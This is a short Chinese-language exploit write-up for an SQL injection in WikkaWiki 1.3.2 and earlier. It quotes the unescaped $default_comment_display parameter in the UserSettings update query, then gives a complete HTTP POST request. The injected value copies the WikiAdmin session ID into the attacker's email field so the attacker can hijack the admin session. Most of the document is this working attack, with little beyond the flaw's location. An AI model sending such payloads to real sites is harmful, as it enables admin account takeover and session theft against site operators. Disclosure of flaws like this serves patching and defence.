# WikkaWiki <= 1.3.2 - Multiple Security Vulnerabilities
---
/actions/usersettings/usersettings.php代码中存在此漏洞

```
141. $this->Query("
142.    UPDATE ".$this->GetConfigValue('table_prefix')."users
143.    SET email = '".mysql_real_escape_string($email)."',
144.    doubleclickedit = '".mysql_real_escape_string($doubleclickedit)."',
145.    show_comments = '".mysql_real_escape_string($show_comments)."',
146.    default_comment_display = '".$default_comment_display."',
147.    revisioncount = ".$revisioncount.",
148.    changescount = ".$changescount.",
149.    theme = '".mysql_real_escape_string($usertheme)."'               
150.    WHERE name = '".$user['name']."'
151.    LIMIT 1"
152. );
```

在进行update操作的时候，$default_comment_display是唯一一个没有用mysql_real_escape_string()处理过的参数

可以构造语句获取admin的会话记录用于会话劫持，构造以下请求

```
POST /wikka/UserSettings HTTP/1.1
Host: localhost
Cookie: 96522b217a86eca82f6d72ef88c4c7f4=c3u94bo2csludij3v18787i4p6
Content-Length: 140
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
 
action=update&email=test%40test.com&default_comment_display=',email=(SELECT sessionid FROM wikka_sessions WHERE userid='WikiAdmin'),theme='
```

如果admin已经登录或者会话仍未过期，就可获得admin的会话记录